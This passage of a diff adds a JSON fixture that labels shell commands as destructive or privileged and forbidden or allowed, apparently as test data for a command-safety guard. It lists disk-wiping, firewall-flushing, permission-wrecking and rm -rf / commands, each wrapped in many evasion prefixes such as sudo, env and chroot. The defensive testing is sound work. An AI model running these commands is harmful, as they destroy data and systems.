+  "runuser dd if=/dev/zero of=/dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv dd if=/dev/zero of=/dev/sda": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat dd if=/dev/zero of=/dev/sda": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo iptables -F": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root iptables -F": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas iptables -F": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser iptables -F": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv iptables -F": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat iptables -F": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo nft flush ruleset": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root nft flush ruleset": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas nft flush ruleset": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser nft flush ruleset": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv nft flush ruleset": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat nft flush ruleset": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo chmod -R 777 /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root chmod -R 777 /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas chmod -R 777 /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser chmod -R 777 /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv chmod -R 777 /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat chmod -R 777 /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo chown -R root /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root chown -R root /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas chown -R root /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser chown -R root /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv chown -R root /": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat chown -R root /": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo systemctl reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root systemctl reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas systemctl reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser systemctl reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv systemctl reboot": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat systemctl reboot": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat sudo id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat doas id": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat sh -c 'sudo id'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "env bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nohup bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "nice -n 5 bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ionice -c 2 bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "timeout 5 bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "flock /tmp/lk bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "chroot /mnt bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "strace -o /tmp/trace bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "ltrace -o /tmp/trace bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "valgrind bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "command bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "exec bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "setsid bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "xargs -I {} bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "sudo bash -c 'rm -rf /'": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "sudo -u root bash -c 'rm -rf /'": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "doas bash -c 'rm -rf /'": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "runuser bash -c 'rm -rf /'": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "setpriv bash -c 'rm -rf /'": {
+    "class": "privileged",
+    "forbidden": true
+  },
+  "GIT_PAGER=cat bash -c 'rm -rf /'": {
+    "class": "destructive",
+    "forbidden": true
+  },
+  "python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo python3 -c 'print(1)'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root python3 -c 'print(1)'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas python3 -c 'print(1)'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser python3 -c 'print(1)'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv python3 -c 'print(1)'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat python3 -c 'print(1)'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo perl -e 'print 1'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root perl -e 'print 1'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas perl -e 'print 1'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser perl -e 'print 1'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv perl -e 'print 1'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat perl -e 'print 1'": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "env awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nohup awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "nice -n 5 awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ionice -c 2 awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "timeout 5 awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "flock /tmp/lk awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "chroot /mnt awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "valgrind awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "command awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "exec awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setsid awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "xargs -I {} awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat awk 'BEGIN{system(\"sudo id\")}'": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo awk -f /tmp/a.awk": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root awk -f /tmp/a.awk": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas awk -f /tmp/a.awk": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser awk -f /tmp/a.awk": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv awk -f /tmp/a.awk": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat awk -f /tmp/a.awk": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "sudo ssh root@server echo hi": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "sudo -u root ssh root@server echo hi": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "doas ssh root@server echo hi": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "runuser ssh root@server echo hi": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "setpriv ssh root@server echo hi": {
+    "class": "privileged",
+    "forbidden": false
+  },
+  "GIT_PAGER=cat ssh root@server echo hi": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "env make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nohup make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "nice -n 5 make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ionice -c 2 make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "timeout 5 make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "flock /tmp/lk make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "chroot /mnt make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "strace -o /tmp/trace make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "ltrace -o /tmp/trace make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "valgrind make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "command make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "exec make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "setsid make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
+  "xargs -I {} make deploy": {
+    "class": "destructive",
+    "forbidden": false
+  },
